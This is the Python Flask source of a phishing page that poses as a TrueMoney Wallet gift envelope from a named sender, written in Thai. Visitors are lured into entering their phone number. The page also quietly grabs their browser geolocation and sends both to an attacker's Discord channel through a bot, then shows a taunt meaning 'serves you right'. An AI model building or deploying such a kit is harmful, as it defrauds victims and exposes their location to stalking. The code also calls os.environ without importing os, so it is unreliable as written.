import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

# ใส่ Discord Bot Token และ Channel ID ของคุณที่นี่
DISCORD_BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
DISCORD_CHANNEL_ID = "YOUR_DISCORD_CHANNEL_ID"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ซองทรูมันนี่สำหรับคุณ</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f5f7;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #ffffff;
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 700px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 16px;
            font-weight: bold;
            color: #333;
        }
        .content {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        .illustration {
            width: 220px;
            height: auto;
            margin-bottom: 15px;
        }
        .sender-name {
            font-size: 16px;
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }
        .sender-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }
        .input-box {
            border: 2px solid #ff7f00;
            border-radius: 12px;
            padding: 10px 15px;
            width: 100%;
            box-sizing: border-box;
            text-align: left;
            margin-bottom: 20px;
        }
        .input-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 5px;
            display: block;
        }
        .input-field {
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 12px;
            width: 100%;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        .footer-links {
            font-size: 12px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .footer-links a {
            color: #0056b3;
            text-decoration: none;
        }
        .submit-btn {
            background-color: #ff7f00;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <form id="giftForm" class="container" method="POST" action="/submit">
        <div class="header">
            <span>&#10005;</span>
            <span>ซองทรูมันนี่สำหรับคุณ</span>
            <span>&#10005;</span>
        </div>
        
        <div class="content">
            <svg class="illustration" viewBox="0 0 300 250" xmlns="http://www.w3.org/2000/svg">
                <rect width="300" height="250" fill="#fff"/>
                <circle cx="80" cy="60" r="20" fill="#ffcc00"/>
                <text x="75" y="67" font-size="20" fill="#b38600">฿</text>
                <path d="M 50 80 Q 70 110 50 130" stroke="#3399ff" stroke-width="4" fill="none"/>
                <path d="M 100 50 Q 120 30 140 50 Q 120 70 100 50" fill="#ff3333"/>
                <rect x="95" y="80" width="45" height="35" rx="5" fill="#d99b6c"/>
                <path d="M 95 80 L 117 100 L 140 80 Z" fill="#b37747"/>
                <rect x="105" y="90" width="25" height="15" rx="2" fill="#ff6600"/>
                <circle cx="170" cy="190" r="22" fill="#ffcc00"/>
                <circle cx="130" cy="180" r="22" fill="#ffcc00"/>
                <circle cx="150" cy="160" r="25" fill="#ffcc00"/>
                <circle cx="190" cy="170" r="22" fill="#ffcc00"/>
                <text x="163" y="197" font-size="18" fill="#b38600" font-weight="bold">฿</text>
                <text x="123" y="187" font-size="18" fill="#b38600" font-weight="bold">฿</text>
                <text x="143" y="167" font-size="18" fill="#b38600" font-weight="bold">฿</text>
                <text x="183" y="177" font-size="18" fill="#b38600" font-weight="bold">฿</text>
            </svg>

            <div class="sender-name">มนัญญา ***</div>
            <div class="sender-text">ส่งซองทรูมันนี่ให้คุณ</div>

            <div class="input-box">
                <span class="input-label">กรอกเบอร์โทรศัพท์เพื่อรับซอง</span>
                <input type="text" id="phone_number" name="phone_number" class="input-field" placeholder="099-999-9999" required>
            </div>

            <div class="footer-links">
                หากคุณยังไม่มีบัญชีทรูมันนี่ <a href="#">สมัครสมาชิกที่นี่</a><br>
                <a href="#">ดูรายละเอียดซอง</a>
            </div>
        </div>

        <button type="button" class="submit-btn" onclick="getLocationAndSubmit()">รับซองเลย</button>
        
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
    </form>

    <script>
        function getLocationAndSubmit() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        document.getElementById('latitude').value = position.coords.latitude;
                        document.getElementById('longitude').value = position.coords.longitude;
                        document.getElementById('giftForm').submit();
                    },
                    function(error) {
                        document.getElementById('giftForm').submit();
                    }
                );
            } else {
                document.getElementById('giftForm').submit();
            }
        }
    </script>
</body>
</html>
"""

RESULT_TEMPLATE = """
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>แจ้งเตือน</title>
    <style>
        body {
            background-color: #f4f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: sans-serif;
        }
        .message {
            color: red;
            font-size: 48px;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="message">สมน้ำหน้า</div>
</body>
</html>
"""

def send_discord_bot_message(message):
    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "content": message
    }
    try:
        requests.post(url, json=payload, headers=headers)
    except Exception as e:
        print(f"Error sending message: {e}")

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit", methods=["POST"])
def submit():
    phone_number = request.form.get("phone_number")
    lat = request.form.get("latitude")
    lon = request.form.get("longitude")
    
    message = f"📱 **มีการกรอกข้อมูล:**\nเบอร์: `{phone_number}`"
    if lat and lon:
        message += f"\n📍 **พิกัด:** https://www.google.com/maps?q={lat},{lon}"
    else:
        message += f"\n📍 **พิกัด:** ไม่ได้รับอนุญาตหรือดึงไม่ได้"
        
    send_discord_bot_message(message)
    return render_template_string(RESULT_TEMPLATE)
  
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
  


